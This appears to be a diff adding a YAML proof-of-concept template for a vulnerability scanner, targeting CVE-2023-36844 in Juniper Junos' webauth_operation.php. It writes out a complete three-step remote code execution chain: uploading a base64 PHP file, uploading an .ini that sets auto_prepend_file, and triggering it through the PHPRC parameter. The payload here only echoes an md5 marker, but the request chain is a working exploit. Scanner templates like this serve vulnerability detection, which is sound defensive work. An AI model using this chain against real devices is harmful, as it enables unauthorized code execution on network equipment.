@@ -1,0 +1,50 @@
+id: poc-yaml-junos-webauth-operation-php-rce
+info:
+  name: Junos webauth_operation.php 代码执行漏洞（CVE-2023-36844）
+  severity: critical
+  tags:
+  - rce
+  - CVE-2023-36844
+  finger: Junos
+variables:
+  v1: random_str(8)
+  payload: concat("('<?php echo md5('",v1,"');?>')")
+  payload_base64: base64(payload)
+  payload_length: len(payload)
+  file_name1: random_str(5)
+  file_name2: random_str(5)
+requests:
+- method: POST
+  path: /webauth_operation.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,{{.payload_base64}}",
+    "fileName": "{{.file_name}}.php", "csize": {{.payload_length}}}]
+
+    '
+  expression: status_code == 200 && contains(body, "+:{\"converted_fileName\":")
+  output:
+  - regex_match(body, "(?P<phpfile>[a-f0-9]{64}\\.php)")
+  - set_var("data_base64", base64(concat("auto_prepend_file=\"/var/tmp/",phpfile,"\"")))
+- method: POST
+  path: /webauth_operation.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'rs=do_upload&rsargs[]=[{"fileName": "{{.file_name2}}.ini", "fileData": "data:text/html;base64,{{.data_base64}}",
+    "csize": "97" }]
+
+    '
+  expression: "status_code == 200 \n&& contains(body, \"{\\\"converted_fileName\\\"\
+    :  {0:\")\n"
+  output:
+  - regex_match(body, "(?P<file>[a-f0-9]{64}\\.ini)")
+- method: GET
+  path: /webauth_operation.php?PHPRC=/var/tmp/{{.file}}
+  expression: 'status_code == 200
+
+    && contains(body, md5(v1))
+
+    && contains(body, "sajax_handle_clie")
+
+    '
+transport: http
